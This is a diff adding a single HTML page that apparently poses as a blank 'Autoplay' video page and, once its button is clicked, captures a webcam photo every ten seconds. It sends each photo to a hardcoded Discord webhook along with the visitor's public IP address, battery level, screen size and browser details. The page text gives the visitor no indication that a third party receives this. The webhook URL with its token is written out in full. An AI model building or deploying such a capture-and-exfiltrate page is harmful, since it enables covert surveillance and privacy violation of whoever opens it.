@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>10000</title>
+    <!-- Load Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* Custom styles for better visual appeal */
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f3f4f6;
+        }
+        .container {
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+            background: #ffffff;
+        }
+        .video-feed {
+            /* Ensure the video feed is a responsive square/rectangle */
+            width: 100%;
+            max-width: 400px;
+            height: auto;
+            border-radius: 0.75rem;
+            box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.2);
+            object-fit: cover;
+            transform: scaleX(-1); /* Mirror the video feed for a more natural self-view */
+        }
+        .status-box {
+            min-height: 4rem;
+        }
+    </style>
+</head>
+<body class="p-4 flex items-center justify-center min-h-screen">
+
+    <div class="container p-6 md:p-10 rounded-xl max-w-lg w-full text-center">
+        <h1 class="text-3xl font-bold text-gray-800 mb-6">r</h1>
+        <p class="text-gray-600 mb-6"></p>
+
+        <!-- Video Feed Container -->
+        <div class="flex justify-center mb-6">
+            <!-- The video element shows the live stream -->
+            <video id="videoFeed" class="video-feed border-4 border-indigo-500/50" autoplay playsinline></video>
+            <!-- The canvas is used internally for taking the snapshot but is hidden -->
+            <canvas id="photoCanvas" style="display: none;"></canvas>
+        </div>
+
+        <!-- Controls -->
+        <div class="space-y-4">
+            <button id="toggleButton" class="w-full py-3 px-6 text-white font-semibold rounded-lg transition duration-150 ease-in-out shadow-md bg-green-600 hover:bg-green-700 active:bg-green-800">
+                Start Autoplay
+            </button>
+        </div>
+
+        <!-- Status & Log -->
+        <div class="mt-8 p-4 rounded-lg status-box text-sm font-mono text-left" id="statusLog">
+            <p class="text-gray-500">Awaiting user action...</p>
+        </div>
+    </div>
+
+    <script type="module">
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1394328442627031070/6sE0EugGgQj7n0YoeSqLFB0A8WoXS0pHFN28gAkL4ZTD-Uh2menOaBWhZj6D6xislzL8";
+        const CAPTURE_INTERVAL_MS = 10000; // 10 seconds
+        const IP_API_URL = "https://api.ipify.org?format=json";
+        
+        const video = document.getElementById('videoFeed');
+        const canvas = document.getElementById('photoCanvas');
+        const toggleButton = document.getElementById('toggleButton');
+        const statusLog = document.getElementById('statusLog');
+
+        let stream = null;
+        let captureInterval = null;
+        let isRunning = false;
+        
+        /**
+         * Gets the public IP address using an external service.
+         * @returns {Promise<string>} The IP address or "Unknown".
+         */
+        const getPublicIP = async () => {
+            try {
+                const response = await fetch(IP_API_URL);
+                const data = await response.json();
+                return data.ip || 'Unknown';
+            } catch (e) {
+                console.error("Failed to fetch public IP:", e);
+                return 'Failed (API Error)';
+            }
+        };
+
+        /**
+         * Extracts basic device, browser, and battery information.
+         * NOTE: This function is now ASYNC to handle the battery API call.
+         * @returns {Promise<object>} Device and browser details including battery status.
+         */
+        const getDeviceInfo = async () => {
+            let batteryStatus = 'Not Supported';
+            
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    const level = (battery.level * 100).toFixed(0) + '%';
+                    const charging = battery.charging ? '⚡ Charging' : '🔋 Discharging';
+                    batteryStatus = `${level} (${charging})`;
+                } catch (e) {
+                    console.error("Failed to get battery status:", e);
+                    batteryStatus = 'Error fetching status';
+                }
+            }
+            
+            return {
+                userAgent: navigator.userAgent,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                viewport: `${window.innerWidth}x${window.innerHeight}`,
+                battery: batteryStatus,
+                time: new Date().toLocaleString(),
+            };
+        };
+
+        /**
+         * Converts a data URL (like those from canvas.toDataURL) to a Blob object.
+         * @param {string} dataurl - The data URL string.
+         * @param {string} filename - The desired filename for the Blob.
+         * @returns {Blob} The Blob object.
+         */
+        const dataURLtoBlob = (dataurl, filename) => {
+            const arr = dataurl.split(',');
+            const mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]);
+            let n = bstr.length;
+            const u8arr = new Uint8Array(n);
+            while(n--){
+                u8arr[n] = bstr.charCodeAt(n);
+            }
+            return new Blob([u8arr], {type: mime, name: filename});
+        };
+
+        /**
+         * Posts the captured image and device metadata to the Discord Webhook.
+         * @param {Blob} imageBlob - The image data as a Blob.
+         * @param {object} deviceInfo - The device information.
+         * @param {string} ipAddress - The public IP address.
+         */
+        const postToDiscord = async (imageBlob, deviceInfo, ipAddress) => {
+            const formData = new FormData();
+            
+            // 1. Prepare the file
+            const timestamp = new Date().toISOString().replace(/[^0-9]/g, '');
+            const filename = `capture_${timestamp}.png`;
+            formData.append('file', imageBlob, filename);
+
+            // 2. Prepare the Discord Embed payload
+            const discordEmbed = {
+                title: 'New Automated Camera Capture',
+                description: `Capture Time: **${deviceInfo.time}**`,
+                color: 5814783, // Discord blue
+                fields: [
+                    { name: 'Public IP Address', value: `\`${ipAddress}\``, inline: true },
+                    { name: 'Battery Status', value: `\`${deviceInfo.battery}\``, inline: true },
+                    { name: 'Screen/Viewport', value: `${deviceInfo.screen} / ${deviceInfo.viewport}`, inline: true },
+                    { name: 'User Agent (Device/OS/Browser)', value: `\`${deviceInfo.userAgent.substring(0, 100)}...\``, inline: false },
+                ],
+                // Add the uploaded image as the embed image
+                image: {
+                    url: `attachment://${filename}`
+                },
+                footer: {
+                    text: 'Automated Camera Bot'
+                },
+                timestamp: new Date().toISOString(),
+            };
+
+            const payload = {
+                username: 'Camera Bot',
+                embeds: [discordEmbed],
+                attachments: [] // Important to include attachments array if using API v9+ for files
+            };
+
+            // 3. Append the JSON payload to the form data
+            formData.append('payload_json', JSON.stringify(payload));
+
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData,
+                });
+
+                if (response.ok) {
+                    logStatus('✅ Image and data sent successfully to Discord.', 'text-green-600 bg-green-50');
+                } else {
+                    const errorData = await response.json();
+                    logStatus(`❌ Discord Error (${response.status}): ${JSON.stringify(errorData)}`, 'text-red-600 bg-red-50');
+                }
+            } catch (error) {
+                logStatus(`❌ Network/Fetch Error: ${error.message}`, 'text-red-600 bg-red-50');
+            }
+        };
+
+        /**
+         * Captures a frame from the video stream and posts it.
+         */
+        const captureAndPost = async () => {
+            if (!stream) {
+                logStatus('Warning: Camera stream not active.', 'text-yellow-600 bg-yellow-50');
+                return;
+            }
+
+            logStatus('📸 Capturing photo and fetching data...', 'text-indigo-600 bg-indigo-50');
+
+            // Set canvas dimensions to match video stream
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            // Draw the current video frame onto the canvas
+            const ctx = canvas.getContext('2d');
+            
+            // Mirror the image on the canvas
+            ctx.translate(canvas.width, 0);
+            ctx.scale(-1, 1);
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            ctx.setTransform(1, 0, 0, 1, 0, 0); // Reset transform
+
+            // Convert canvas to Data URL and then Blob
+            const dataURL = canvas.toDataURL('image/png');
+            const imageBlob = dataURLtoBlob(dataURL, 'photo.png');
+            
+            // Get device info and IP (these must be awaited now)
+            const deviceInfo = await getDeviceInfo(); 
+            const ipAddress = await getPublicIP();
+
+            // Post to Discord
+            postToDiscord(imageBlob, deviceInfo, ipAddress);
+        };
+
+        /**
+         * Starts the camera and the auto capture interval.
+         */
+        const startCapture = async () => {
+            try {
+                // Request camera access
+                stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+
+                // Start the interval
+                // Capture immediately, but wait for 1 second to ensure metadata is stable
+                setTimeout(captureAndPost, 1000); 
+                captureInterval = setInterval(captureAndPost, CAPTURE_INTERVAL_MS);
+                
+                isRunning = true;
+                toggleButton.textContent = `Stop Autoplay (Sending every ${CAPTURE_INTERVAL_MS / 1000}s)`;
+                toggleButton.classList.remove('bg-green-600', 'hover:bg-green-700', 'active:bg-green-800');
+                toggleButton.classList.add('bg-red-600', 'hover:bg-red-700', 'active:bg-red-800');
+                logStatus('✅ Camera started and auto capture initiated.', 'text-green-600 bg-green-50');
+
+            } catch (err) {
+                logStatus(`❌ Failed to access camera: ${err.name}. Please ensure your camera is not blocked and try again.`, 'text-red-600 bg-red-50');
+                isRunning = false;
+                stopCapture();
+            }
+        };
+
+        /**
+         * Stops the camera stream and clears the interval.
+         */
+        const stopCapture = () => {
+            if (captureInterval) {
+                clearInterval(captureInterval);
+                captureInterval = null;
+            }
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                stream = null;
+            }
+            isRunning = false;
+            toggleButton.textContent = 'Start Autoplay';
+            toggleButton.classList.remove('bg-red-600', 'hover:bg-red-700', 'active:bg-red-800');
+            toggleButton.classList.add('bg-green-600', 'hover:bg-green-700', 'active:bg-green-800');
+            logStatus('⏸️ Auto capture stopped.', 'text-yellow-700 bg-yellow-50');
+        };
+
+        /**
+         * Logs status messages to the UI.
+         * @param {string} message - The message to display.
+         * @param {string} classes - Tailwind CSS classes for styling the log entry.
+         */
+        const logStatus = (message, classes) => {
+            const entry = document.createElement('p');
+            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            entry.className = `p-2 my-1 rounded-md transition-all duration-300 ${classes}`;
+
+            // Prepend the new entry
+            statusLog.prepend(entry);
+            
+            // Limit log entries to 10 for performance
+            while (statusLog.children.length > 10) {
+                statusLog.removeChild(statusLog.lastChild);
+            }
+        };
+
+        // Event listener for the toggle button
+        toggleButton.addEventListener('click', () => {
+            if (isRunning) {
+                stopCapture();
+            } else {
+                startCapture();
+            }
+        });
+    </script>
+</body>
+</html>
